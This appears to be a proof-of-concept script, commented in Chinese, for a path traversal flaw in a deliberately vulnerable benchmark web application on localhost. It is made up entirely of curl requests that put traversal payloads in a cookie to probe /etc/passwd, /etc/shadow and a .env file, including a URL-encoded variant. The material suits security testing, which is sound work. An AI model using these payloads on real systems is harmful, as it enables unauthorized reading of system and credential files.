# 步骤1: 获取 Cookie（可选，直接设置 Cookie 头即可）
curl -k -c /tmp/cookies.txt "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003"

# 步骤2: 发送路径遍历 payload 读取 /etc/passwd（证明文件存在）
curl -k -X POST \
  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
  -H "Cookie: BenchmarkTest00003=../../../../etc/passwd"

# 响应包含 "file already exists" 而非 "file doesn't exist yet"

# 步骤3: 枚举其他系统文件
curl -k -X POST \
  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
  -H "Cookie: BenchmarkTest00003=../../../../etc/shadow"

curl -k -X POST \
  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
  -H "Cookie: BenchmarkTest00003=../../.env"

# URL 编码版本也有效（因为 urllib.parse.unquote_plus 会解码）
curl -k -X POST \
  "https://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00003" \
  -H "Cookie: BenchmarkTest00003=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"